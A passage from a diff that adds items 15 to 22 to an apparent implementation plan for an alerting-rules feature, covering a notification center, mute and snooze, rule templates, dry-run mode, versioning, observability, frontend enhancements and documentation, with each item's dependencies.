+15. **In-app notification center** (9S) -- bell component, Realtime subscription. Depends on: 9C, 9R.
+16. **Mute/snooze** (9T) -- rule snooze, project mute, org pause. Depends on: 9C, 9R.
+17. **Rule templates** (9W) -- template catalog, picker UI. Depends on: nothing (frontend only).
+18. **Dry-run mode** (9X) -- dry_run column, dispatcher behavior. Depends on: 9C.
+19. **Rule versioning** (9U) -- change tracking, history UI. Depends on: nothing (can be added alongside CRUD).
+20. **Operational observability** (9Y) -- structured logging, health dashboard, retention cleanup. Depends on: 9C, 9J.
+21. **Frontend enhancements** (9D.6-9D.8) -- live validation, IntelliSense, auto-save. Depends on: nothing (frontend only).
+22. **Documentation** (9Z) -- all docs updates. Depends on: all features being finalized.
 
